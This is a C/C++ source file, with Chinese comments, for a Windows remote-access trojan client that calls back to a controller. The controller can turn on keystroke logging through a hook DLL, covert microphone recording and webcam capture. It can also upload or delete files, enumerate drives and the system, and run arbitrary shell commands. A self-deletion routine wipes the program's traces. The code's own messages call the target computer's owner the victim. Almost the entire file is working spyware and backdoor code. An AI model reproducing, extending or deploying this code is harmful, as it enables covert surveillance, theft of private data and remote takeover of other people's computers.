#include <winSock2.h>
#include <stdio.h>
#include <string.h>
#include <io.h>
#include <pthread.h>
#include <shlwapi.h>
#include <direct.h>
#include <tlhelp32.h>
#include <opencv2/opencv.hpp>
#include <winternl.h>
#pragma comment(lib,"Shlwapi.lib")
#pragma comment(lib, "winmm.lib")
using namespace cv;
#pragma warning(disable:4996)
#pragma warning(disable:4700)
#pragma warning(disable:4312)
#define DATA_BUFMAX 2048
#define DATA_BUFMIN 45
#define DATA_BUFMID 2000
#define IP_PORT 9999
#define IP_ADDR "127.0.0.1"
#define DEBUG
#ifndef DEBUG
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#endif // !DEBUG

typedef struct _WHO {
    int Num;
    char Name[20];
}IDINFO;
typedef struct _SERVER {
    IDINFO ID;// 接收:谁发生过来的信息 发送:发送给谁？-->信息反馈目标
    int Size;// 消息大小，在 Command 的消息为 FileInfo 时，为文件大小
    char Type[2];// 发送的类型 第一次区分指令
    char Command[10];// 第二次区分指令
    char Info[DATA_BUFMID];// 要发送的内容
}SERVER;
typedef struct _FILE {
    FILE* fp;
    int FileSize;// 总大小
    int GetSize;// 得到的大小
    char name[200];
}SAVE_FILE;
pthread_t KeyBoardProc;
pthread_t TapeProc;
// HOOK键盘技术
void* Hook_Keyboard(void *arg) {
    HMODULE hModule = LoadLibrary(TEXT("hook_keyboard.dll"));
    if (hModule == NULL) { 
#ifdef DEBUG
        printf("获取DLL失败\n");
#endif // DEBUG
        return (void*)1;
    }
    typedef BOOL(*HOOK)();
    HOOK LoadHook = (HOOK)GetProcAddress(hModule, "LoadHook");
    HOOK UnloadHook = (HOOK)GetProcAddress(hModule, "UnloadHooK");
    if (LoadHook == NULL || UnloadHook == NULL) {
#ifdef DEBUG
        printf("获取DLL函数地址失败\n");
#endif // DEBUG
        return (void*)1;
    }
    LoadHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnloadHook();
    return (void*)1;
}
// 录音
void* Tape(void* arg) {
    HWAVEIN hWaveIn; // 输入设备
    WAVEFORMATEX waveform;
    waveform.wFormatTag = WAVE_FORMAT_PCM;
    waveform.nSamplesPerSec = 11025;//采样率
    waveform.wBitsPerSample = 16;//采样比特
    waveform.nChannels = 1;//采样声道数
    waveform.nBlockAlign = 2;//一个块的大小，采样bit的字节数乘以声道数
    waveform.nAvgBytesPerSec = 16000;//每秒的数据率，就是每秒能采集多少字节的数据
    waveform.cbSize = 0;
    int bufsize = 1024 * 100;
    BYTE* pBuffer;//采集音频时的数据缓存
    WAVEHDR wHdr; //采集音频时包含数据缓存的结构体
    wHdr.dwBufferLength = bufsize;
    wHdr.dwBytesRecorded = 0;
    wHdr.dwBytesRecorded = 0;
    wHdr.dwFlags = 0;
    wHdr.dwLoops = 1;
    HANDLE wait;
    wait = CreateEvent(NULL, 0, 0, NULL);
    waveInOpen(&hWaveIn, WAVE_MAPPER, &waveform, (DWORD_PTR)wait, 0L, CALLBACK_EVENT);
    SYSTEMTIME time;
    char TapeFileName[50] = { 0 };
    FILE* fp = NULL;
    while (1) {
        GetLocalTime(&time);
        sprintf(TapeFileName, "%02dM%02dD%02d-%02d.pcm", time.wMonth, time.wDay, time.wHour, time.wMinute);
        //printf("\n%s ", TapeFileName);
        fp = fopen(TapeFileName, "wb+");
#ifdef DEBUG
        int time = 30;
#else
        int time = 1800;
#endif // DEBUG
        for (int i = 0; i < time; i++) {
            pBuffer = new BYTE[bufsize];
            wHdr.lpData = (LPSTR)pBuffer;
            waveInPrepareHeader(hWaveIn, &wHdr, sizeof(WAVEHDR));//准备一个波形数据块头用于录音
            waveInAddBuffer(hWaveIn, &wHdr, sizeof(WAVEHDR));//指定波形数据块为录音输入缓存
            waveInStart(hWaveIn);//开始录音
            Sleep(1000);//等待声音录制1s
            waveInReset(hWaveIn);//停止录音
            fwrite(pBuffer, 1, wHdr.dwBytesRecorded, fp);
            delete[] pBuffer;
        }
        waveInClose(hWaveIn);
        fclose(fp);
    }
    return (void*)1;
}
// 清理键盘HOOK文件:当文件大小大于规定的时候自动删除
void DelKeyboardLog() {
    FILE* DelKeyBoardLogFILE = nullptr;
    DelKeyBoardLogFILE = fopen("keyboard.txt", "r");
    if (DelKeyBoardLogFILE != NULL) {
        fseek(DelKeyBoardLogFILE, 0, SEEK_END);
        long int FileSize = ftell(DelKeyBoardLogFILE);
        if (FileSize >= 1024 * 1024 * 1024) {
            remove("keyboard.txt");
        }
    }
    return;
}
// 自我部署
// 自爆,删除 删除了但是还在运行 原理:复制自己—》运行—》退出-》复制体删除自己
void DelMySelf() {
    char  szPathOrig[MAX_PATH], szPathClone[MAX_PATH];
    GetModuleFileName(NULL, szPathOrig, MAX_PATH);// 路径
    GetTempPath(MAX_PATH, szPathClone);// 检索为临时文件指定的目录的路径
    GetTempFileName(szPathClone, TEXT("Del"), 0, szPathClone);// 创建临时文件的名称。
    CopyFile(szPathOrig, szPathClone, FALSE);// 将现有文件复制到新文件。 旧-->新
    HANDLE hFile = CreateFile(szPathClone, 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
    char CmdLine[512] = { 0 };
    HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
    wsprintf(CmdLine, __TEXT("%s %d \"%s\""), szPathClone, hProcessOrig, szPathOrig);
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    CreateProcess(NULL, CmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    CloseHandle(hProcessOrig);
    CloseHandle(hFile);
    exit(0);
}
// 防御（权限升级）
int main(int argc,char* argv[]) {
    // 先判断删除
    if (__argc != 1) {
        int iSize;
        iSize = MultiByteToWideChar(CP_ACP, 0, argv[1], -1, NULL, 0);
        wchar_t* pwszUnicode = (wchar_t*)malloc(iSize * sizeof(wchar_t));
        MultiByteToWideChar(CP_ACP, 0, argv[1], -1, pwszUnicode, iSize);
        HANDLE hProcessOrig = (HANDLE) _wtoi(pwszUnicode);
        WaitForSingleObject(hProcessOrig, INFINITE);
        CloseHandle(hProcessOrig);
        DeleteFile(argv[2]);
#ifdef DEBUG
        printf("将清理 %s\n", argv[2]);
#endif
#ifndef DEBUG
        char cmd[50] = { 0 };
        sprintf(cmd,"cipher /W:%s",argv[2][1]);
        WinExec(cmd, SW_HIDE);
#endif // !DEBUG
        return 0;
    }
    while (1) {
        DelKeyboardLog();
        // 线程 定义:文件存在就是开启运行
        if (fopen("KeyBoardLog.txt", "r") == NULL) {
#ifdef DEBUG
            printf("[OFF]键盘记录\n");
#endif // DEBUG
        }
        else {
#ifdef DEBUG
            printf("[ON]键盘记录\n");
#endif // DEBUG
            pthread_create(&KeyBoardProc, NULL, Hook_Keyboard, NULL);
            pthread_detach(KeyBoardProc);
        }
        if (fopen("Tape.txt", "r") == NULL) {
#ifdef DEBUG
            printf("[OFF]录音");
#endif
        }
        else {
#ifdef DEBUG
            printf("[ON]录音");
#endif
            pthread_create(&TapeProc, NULL, Tape, NULL);
            pthread_detach(TapeProc);
        }
        WSAData wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 0;
        SOCKET TCP_Client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (TCP_Client == INVALID_SOCKET) return 0;
        SAVE_FILE SaveFile;
        sockaddr_in addrServ;
        addrServ.sin_family = AF_INET;
        addrServ.sin_port = htons(IP_PORT);
        addrServ.sin_addr.S_un.S_addr = inet_addr(IP_ADDR);
        FILE* ClientIP_FILE = fopen("IP.txt", "r");
        while ((connect(TCP_Client, (LPSOCKADDR)&addrServ, sizeof(addrServ))) == SOCKET_ERROR) {
            if (ClientIP_FILE != NULL) {
                char IP[50] = { 0 };
                if (fgets(IP, 50, ClientIP_FILE) == NULL) {
                    fseek(ClientIP_FILE, 0, SEEK_SET);
                    addrServ.sin_addr.S_un.S_addr = inet_addr(IP_ADDR);
                    continue;
                }
                addrServ.sin_addr.S_un.S_addr = inet_addr(IP);
            }
#ifndef DEBUG
            Sleep(240000);// 4min
#else
            Sleep(5000);// 5s
#endif
        }
        if (ClientIP_FILE != nullptr) {
            fclose(ClientIP_FILE);
            delete ClientIP_FILE;
        }
        SERVER SendInfoStructure;
        while (1) {
            RtlZeroMemory(&SendInfoStructure, sizeof(SendInfoStructure));
            char RecvInfo[DATA_BUFMAX] = { 0 };
            // 阻碍式接收
            if (recv(TCP_Client, RecvInfo, DATA_BUFMAX, 0) == SOCKET_ERROR) {
#ifdef DEBUG
                printf("已断开连接");
#endif
                break;// 目的:重新连接
            }
            SERVER* GetInfoStructure = (SERVER*)&RecvInfo;// 解析
            strcpy(SendInfoStructure.Type, "I");
            SendInfoStructure.ID.Num = GetInfoStructure->ID.Num;
            strcpy(SendInfoStructure.ID.Name, GetInfoStructure->ID.Name);
#ifdef DEBUG
            printf("Type:%s Command:%s Info:%s\n", GetInfoStructure->Type, GetInfoStructure->Command, GetInfoStructure->Info);
#endif
            if (strcmp(GetInfoStructure->Type, "F") == 0) {
                if (strcmp(GetInfoStructure->Command, "remove") == 0) {
                    if (remove(GetInfoStructure->Info) == 0) {
                        sprintf(SendInfoStructure.Info, "Remove File Success.");
                    }
                    else {
                        sprintf(SendInfoStructure.Info, "ERROR，File Path Is True?");
                    }
                }
                else if (strcmp(GetInfoStructure->Command, "SendFile") == 0) {
                    FILE* fp = fopen(GetInfoStructure->Info, "rb");//以二进制方式打开文件
                    if (fp == NULL) {
                        sprintf(SendInfoStructure.Info, "open file error,file path is True?");
                    }
                    else {
                        // 发送文件信息
                        fseek(fp, 0, SEEK_END);
                        int FileSize = ftell(fp);// 文件指针偏移量(单位:字节)
                        rewind(fp);
                        SendInfoStructure.Size = FileSize;
                        strcpy(SendInfoStructure.Type, "F");
                        strcpy(SendInfoStructure.Command, "FileInfo");
                        char* p;
                        strcpy(SendInfoStructure.Info, (p = strrchr(GetInfoStructure->Info, '\\')) ? p + 1 : GetInfoStructure->Info);
                        if (send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
                        // 发送文件
                        strcpy(SendInfoStructure.Type, "F");
                        strcpy(SendInfoStructure.Command, "RecvFile");
                        SendInfoStructure.Size = 0;
                        while (!feof(fp)) {
                            if (recv(TCP_Client, RecvInfo, DATA_BUFMAX, 0) == SOCKET_ERROR) goto start;
                            memset(SendInfoStructure.Info, 0, sizeof(SendInfoStructure.Info));
                            SendInfoStructure.Size = fread(SendInfoStructure.Info, sizeof(char), sizeof(SendInfoStructure.Info), fp);
                            send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0);
                            //printf("SendFileSize:%d/%d \n", FileSize,SendInfoStructure.Size);
                        }
                        fclose(fp);
                        strcpy(SendInfoStructure.Type, "I");
                        strcpy(SendInfoStructure.Info, "File Send end.");
                    }
                }
                else if (strcmp(GetInfoStructure->Command, "FileInfo") == 0) {
                    SaveFile.fp = fopen(GetInfoStructure->Info, "wb+");
                    SaveFile.FileSize = GetInfoStructure->Size;
                    SaveFile.GetSize = 0;
                    // 反馈确认接收
                    strcpy(SendInfoStructure.Type, "F");
                    strcpy(SendInfoStructure.Info, "continue");
                    //printf("接收大小%d\n", GetInfoStructure->Size);
                }
                else if (strcmp(GetInfoStructure->Command, "RecvFile") == 0) {
                    if (SaveFile.fp == NULL) {
                        strcpy(SendInfoStructure.Type, "I");
                        strcpy(SendInfoStructure.Info, "未发送文件信息");
                        goto Send;
                    };
                    fwrite(GetInfoStructure->Info, sizeof(char), GetInfoStructure->Size, SaveFile.fp);
                    SaveFile.GetSize += GetInfoStructure->Size;
                    // 反馈确认接收
                    strcpy(SendInfoStructure.Type, "F");
                    strcpy(SendInfoStructure.Info, "continue");
                    //printf("%d %d %d\n", SaveFile.FileSize, SaveFile.GetSize, GetInfoStructure->Size);
                    if (SaveFile.FileSize == SaveFile.GetSize) {
                        fclose(SaveFile.fp);
                        SaveFile.fp = NULL;
                        SaveFile.FileSize = 0;
                        SaveFile.GetSize = 0;
                        memset(SaveFile.name, 0, sizeof(SaveFile.name));
                        strcpy(SendInfoStructure.Type, "I");
                        strcpy(SendInfoStructure.Info, "文件接收完毕");
                        goto Send;
                    }
                }
            }
            else if (strcmp(GetInfoStructure->Type, "L") == 0) {
                // pan
                if (strcmp(GetInfoStructure->Info, "pan") == 0) {
                    DWORD Size = MAX_PATH;
                    char Info[MAX_PATH] = { 0 };
                    DWORD Result = GetLogicalDriveStringsA(Size, Info);
                    if (Result > 0 && Result <= MAX_PATH) {
                        char* Drive = Info;
                        while (*Drive) {
                            strcat(SendInfoStructure.Info, Drive);
                            Drive += strlen(Drive) + 1;
                        }
                    }
                }
                else if (strcmp(GetInfoStructure->Command,"path") == 0) {
                    strcpy(SendInfoStructure.Type, "I");
                    char Path[200] = { 0 };
                    strcpy(Path, GetInfoStructure->Info);
                    char filePath[100] = { 0 };
                    strcpy(filePath, GetInfoStructure->Info);
                    strcat(Path, "\\*.*");
                    HANDLE file;
                    WIN32_FIND_DATA pNextInfo;
                    file = FindFirstFile(Path, &pNextInfo);
                    if (file == INVALID_HANDLE_VALUE) {
                        strcpy(SendInfoStructure.Type, "I");
                        strcpy(SendInfoStructure.Info, "can't see file!");
                    }
                    else {
                        for (int i = 1; FindNextFile(file, &pNextInfo);i++) {
                            if (pNextInfo.cFileName[0] == '.') {
                                i--; 
                                continue;
                            }
                            SYSTEMTIME LastWriteTime, AccessTime, CreationTime;
                            FileTimeToSystemTime(&pNextInfo.ftLastWriteTime, &LastWriteTime);// 最后一次修改
                            FileTimeToSystemTime(&pNextInfo.ftLastAccessTime, &AccessTime);//  最后一次访问
                            FileTimeToSystemTime(&pNextInfo.ftCreationTime, &CreationTime);// 创建时间
                            sprintf(SendInfoStructure.Info, "No.%d FILE: %s\\%s\t创建时间:%d年%d月%d日\t最后一次修改时间:%d年%d月%d日\t最后一次访问时间:%d年%d月%d日", i, filePath, pNextInfo.cFileName,CreationTime.wYear, CreationTime.wMonth, CreationTime.wDay, LastWriteTime.wYear, LastWriteTime.wMonth, LastWriteTime.wDay, AccessTime.wYear, AccessTime.wMonth, AccessTime.wDay);
                            // 发送
                            SendInfoStructure.Size = strlen(SendInfoStructure.Info);
                            strcpy(SendInfoStructure.Type, SendInfoStructure.Type);
                            strcpy(SendInfoStructure.Info, SendInfoStructure.Info);
                            if (send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
                            memset(SendInfoStructure.Info, 0, sizeof(SendInfoStructure.Info));
                        }
                    }
                    continue;
                }
                else if (strcmp(GetInfoStructure->Info, "systeminfo") == 0) {
                    char SystemName[255] = { 0 };
                    char UserName[255] = { 0 };
                    unsigned long size = 0;
                    GetComputerName(SystemName, &size);
                    GetUserName(UserName, &size);
                    sprintf(SendInfoStructure.Info, "Compute Name:\"%s\" , Now UserName:\"%s\"", SystemName, UserName);
                }
                else if (strcmp(GetInfoStructure->Info, "runpath") == 0) {
                    getcwd(SendInfoStructure.Info, sizeof(SendInfoStructure.Info));
                    strcat(SendInfoStructure.Info, "\nThis now run path,[Don't touch txt file!!!].");
                }
                else if (strcmp(GetInfoStructure->Info, "camera") == 0) {
                    VideoCapture camera;
                    camera.open(0);
                    if (!camera.isOpened()) {
                        sprintf(SendInfoStructure.Info, "Open camera error,exit Send");
                    }
                    else {
                        char PhotoName[500] = {0};
                        cv::Mat frame;
                        camera >> frame;
                        if (frame.empty()) {
                            sprintf(SendInfoStructure.Info, "open camera error,exit Send");
                        }
                        else {
                            SYSTEMTIME time;
                            GetLocalTime(&time);
                            sprintf(PhotoName, "\\%02d%02d%02d%02d.jpg", time.wMonth, time.wDay, time.wHour, time.wMinute);
                            char PhotoPath[500] = { 0 };
                            getcwd(PhotoPath, sizeof(PhotoPath));
                            strcat(PhotoPath, PhotoName);
                            cv::imwrite(PhotoPath, frame);
                            //sprintf(SendInfoStructure.Info, "成功,请及时删除照片。照片地址:%s", PhotoPath);
                            FILE* fp = fopen(PhotoPath, "rb");//以二进制方式打开文件
                            if (fp == NULL) {
                                sprintf(SendInfoStructure.Info, "open file error，path is False:%s",PhotoPath);
                            }
                            else {
                                // 发送文件信息
                                fseek(fp, 0, SEEK_END);
                                int FileSize = ftell(fp);// 文件指针偏移量(单位:字节)
                                rewind(fp);
                                SendInfoStructure.Size = FileSize;
                                strcpy(SendInfoStructure.Type, "F");
                                strcpy(SendInfoStructure.Command, "FileInfo");
                                char* p;
                                strcpy(SendInfoStructure.Info, (p = strrchr(PhotoPath, '\\')) ? p + 1 : PhotoPath);
                                if (send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
                                // 发送文件
                                strcpy(SendInfoStructure.Type, "F");
                                strcpy(SendInfoStructure.Command, "RecvFile");
                                SendInfoStructure.Size = 0;
                                while (!feof(fp)) {
                                    if (recv(TCP_Client, RecvInfo, DATA_BUFMAX, 0) == SOCKET_ERROR) {
                                        remove(PhotoPath);
                                        goto start;
                                    }
                                    memset(SendInfoStructure.Info, 0, sizeof(SendInfoStructure.Info));
                                    SendInfoStructure.Size = fread(SendInfoStructure.Info, sizeof(char), sizeof(SendInfoStructure.Info), fp);
                                    send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0);
                                }
                                fclose(fp);
                                strcpy(SendInfoStructure.Type, "I");
                                if (remove(PhotoPath) == 0)
                                    sprintf(SendInfoStructure.Info, "文件已发送完毕,图片在受害者电脑位置:%s[已删除]",PhotoPath);
                                else sprintf(SendInfoStructure.Info, "文件已发送完毕,图片在受害者电脑位置:%s[自动删除失败]", PhotoPath);
                            }
                        }
                    }
                }
                else if (strcmp(GetInfoStructure->Info, "pthread") == 0) {
                    if (pthread_kill(KeyBoardProc, 0) == 0) {
                        strcpy(GetInfoStructure->Info, "键盘监听已开启 ");
                    }
                    else {
                        strcpy(GetInfoStructure->Info, "键盘监听未开启 ");
                    }
                    if (pthread_kill(TapeProc, 0) == 0) {
                        strcat(GetInfoStructure->Info, "录音模式已开启 ");
                    }
                    else {
                        strcat(GetInfoStructure->Info, "录音模式未开启 ");
                    }
                }
            }
            else if (strcmp(GetInfoStructure->Type, "S") == 0) {
                if (strcmp(GetInfoStructure->Info, "FUCK") == 0) break;
                else if (strcmp(GetInfoStructure->Info, "keyboard") == 0) {
                    if (fopen("KeyBoardLog.txt", "rb") == NULL) {
                        fopen("KeyBoardLog.txt", "a");
                        sprintf(SendInfoStructure.Info, "HOOK KeyBoard 已设置为开启 ");
                    }
                    else {
                        sprintf(SendInfoStructure.Info, "HOOK KeyBoard 已设置为关闭 ");
                        remove("KeyBoardLog.txt");
                    }
                    strcat(SendInfoStructure.Info, "重启生效");
                }
                else if (strcmp(GetInfoStructure->Info, "tape") == 0) {
                    if (fopen("Tape.txt", "r") == NULL) {
                        fopen("tape.txt", "a");
                        sprintf(SendInfoStructure.Info, "录音 已设置为开启 ");
                    }
                    else {
                        remove("Tape.txt");
                        sprintf(SendInfoStructure.Info, "录音 已设置为关闭 ");
                    }
                    strcat(SendInfoStructure.Info, "重启生效");
                }
            }
            else if (strcmp(GetInfoStructure->Type, "C") == 0) {
                if (strcmp(GetInfoStructure->Command, "cmd") == 0) {
                    if (GetInfoStructure->ID.Num != 0) {
                        strcpy(SendInfoStructure.Info, "你没有执行的权力,拒绝执行");
                        goto Send;
                    }
                    HANDLE hRead;
                    HANDLE hWrite;
                    SECURITY_ATTRIBUTES sa = { sizeof(sa) };
                    sa.bInheritHandle = TRUE;
                    sa.lpSecurityDescriptor = NULL;
                    sa.nLength = sizeof(SECURITY_ANONYMOUS);
                    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
                        sprintf(SendInfoStructure.Info, "创建管道失败,取消执行");
                    }
                    else {
                        STARTUPINFO si;
                        PROCESS_INFORMATION pi;
                        ZeroMemory(&si, sizeof(si));
                        si.cb = sizeof(STARTUPINFO);
                        si.dwFlags = STARTF_USESTDHANDLES;
                        si.hStdInput = hRead;
                        si.hStdOutput = hWrite;
                        si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
                        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                        if (!CreateProcessA(NULL, GetInfoStructure->Info, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
                            strcpy(SendInfoStructure.Info,"执行指令失败,取消执行");
                        }
                        else {
                            Sleep(1000);
                            WaitForSingleObject(pi.hThread, -1);
                            WaitForSingleObject(pi.hProcess, -1);
                            DWORD Size = 1;
                            if (!ReadFile(hRead, SendInfoStructure.Info, sizeof(SendInfoStructure.Info), &Size, NULL)) {
                                sprintf(SendInfoStructure.Info, "读取返回值失败,取消执行");
                            }
                        }
                        CloseHandle(hWrite);
                        CloseHandle(hRead);
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    }
                }
                else if (strcmp(GetInfoStructure->Info, "KILL") == 0) {
#ifdef DEBUG
                    printf("结束程序\n");
#endif
                    DelMySelf();
                }
            }
            Send:
            // 发送
            int Send_size = strlen(SendInfoStructure.Info);
            if (Send_size == 0) {
                strcpy(SendInfoStructure.Type, "I");
                strcpy(SendInfoStructure.Info, "没有对应的指令");
            }
            SendInfoStructure.Size = Send_size;
            //printf("%s\n", SendInfoStructure.Info);
            if (send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0) == SOCKET_ERROR) break;
        }
    start:
        if (pthread_kill(KeyBoardProc, 0) == 0) {
            pthread_cancel(KeyBoardProc);
        }
        if (pthread_kill(TapeProc, 0) == 0) {
            pthread_cancel(TapeProc);
        }
        closesocket(TCP_Client);
        WSACleanup();
        Sleep(1000);
    }
    return - 1;
}